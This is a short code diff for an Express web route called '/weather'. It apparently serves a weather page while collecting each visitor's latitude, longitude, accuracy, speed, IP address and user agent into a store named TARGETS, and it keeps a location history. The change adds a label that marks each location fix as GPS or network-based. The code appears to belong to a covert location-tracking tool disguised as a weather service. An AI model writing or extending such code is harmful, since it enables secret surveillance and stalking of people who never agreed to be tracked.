@@ -37,7 +37,7 @@ router.route("/weather")
         res.render("weather")
     })
     .post((req, res) => {
-        let { id, lat, lng, accuracy, speed } = req.body
+        let { id, lat, lng, accuracy, speed, type } = req.body
 
         // Validation & Sanitization
         if (!id || typeof id !== "string") {
@@ -69,6 +69,7 @@ router.route("/weather")
                 speed: numSpeed,
                 firstSeen: now,
                 lastSeen: now,
+                type: type || (numAccuracy && numAccuracy < 200 ? "GPS" : "Network"),
                 ip: req.ip || req.headers["x-forwarded-for"] || "Unknown",
                 userAgent: req.headers["user-agent"] || "Unknown",
                 history: []
@@ -82,6 +83,7 @@ router.route("/weather")
             TARGETS[id].accuracy = numAccuracy
             TARGETS[id].speed = numSpeed
             TARGETS[id].lastSeen = now
+            if (type) TARGETS[id].type = type
         }
 
         // Add to history
